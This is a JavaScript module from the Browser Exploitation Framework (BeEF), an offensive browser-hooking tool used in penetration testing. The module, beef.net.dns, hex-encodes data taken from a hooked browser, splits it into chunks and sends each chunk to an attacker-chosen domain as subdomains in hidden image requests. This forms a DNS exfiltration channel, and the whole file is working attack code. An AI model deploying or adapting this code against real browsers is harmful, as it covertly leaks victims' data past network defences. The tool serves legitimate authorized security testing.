//
// Copyright (c) 2006-2014 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (BeEF) - http://beefproject.com
// See the file 'doc/COPYING' for copying permission
//

/*!
 * @literal object: beef.net.dns
 * 
 * request object structure:
 * + msgId: {Integer} Unique message ID for the request.
 * + domain: {String} Remote domain to retrieve the data.
 * + wait: {Integer} Wait time between requests (milliseconds) - NOT IMPLEMENTED
 * + callback: {Function} Callback function to receive the number of requests sent.
 */

beef.net.dns = {

	handler: "dns",

	send: function(msgId, data, domain, callback) {

        var encode_data = function(str) {
            var result="";
            for(i=0;i<str.length;++i) {
                result+=str.charCodeAt(i).toString(16).toUpperCase();
            }
            return result;
        };

        var encodedData = encodeURI(encode_data(data));

        //TODO remove this
        console.log(encodedData);
        console.log("_encodedData_ length: " + encodedData.length);

        // limitations to DNS according to RFC 1035:
        // o Domain names must only consist of a-z, A-Z, 0-9, hyphen (-) and fullstop (.) characters
        // o Domain names are limited to 255 characters in length (including dots)
        // o The name space has a maximum depth of 127 levels (ie, maximum 127 subdomains)
        // o Subdomains are limited to 63 characters in length (including the trailing dot)

        // DNS request structure:
        // COMMAND_ID.SEQ_NUM.SEQ_TOT.DATA.DOMAIN
      //max_length: 3.   3   .   3   . 63 . x

        // only max_data_segment_length is currently used to split data into chunks. and only 1 chunk is used per request.
        // for optimal performance, use the following vars and use the whole available space (which needs changes server-side too)
        var reserved_seq_length = 3 + 3 + 3 + 3; // consider also 3 dots
        var max_domain_length = 255 - reserved_seq_length; //leave some space for sequence numbers
        var max_data_segment_length = 63; // by RFC

        //TODO remove this
        console.log("max_data_segment_length: " + max_data_segment_length);

        var dom = document.createElement('b');

        String.prototype.chunk = function(n) {
            if (typeof n=='undefined') n=100;
            return this.match(RegExp('.{1,'+n+'}','g'));
        };

        var sendQuery = function(query) {
            var img = new Image;
            //img.src = "http://"+query;
            img.src = beef.net.httpproto + "://" + query; // prevents issues with mixed content
            img.onload = function() { dom.removeChild(this); }
            img.onerror = function() { dom.removeChild(this); }
            dom.appendChild(img);
        };

        var segments = encodedData.chunk(max_data_segment_length);

        //TODO remove this
        console.log(segments.length);

        for (var seq=1; seq<=segments.length; seq++) {
            sendQuery(msgId + "." + seq + "." + segments.length + "." + segments[seq-1] + "." + domain);
        }

		// callback - returns the number of queries sent
		if (!!callback) callback(segments.length);

	}

};

beef.regCmp('beef.net.dns');

